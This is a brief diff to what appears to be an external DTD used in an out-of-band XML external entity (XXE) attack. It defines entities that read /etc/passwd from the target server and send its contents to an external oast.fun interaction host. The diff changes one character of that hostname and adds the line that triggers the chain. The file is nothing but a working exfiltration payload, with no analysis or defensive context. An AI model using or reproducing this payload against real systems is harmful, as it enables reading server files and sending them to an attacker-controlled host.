@@ -1,2 +1,3 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://uaoetzvavoopuntbmsppj31hgd3cn64uo.oast.fun/%file;'>">
+<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://uaoetzvavoopuntbmsppj3ihgd3cn64uo.oast.fun/%file;'>">
+%stack;
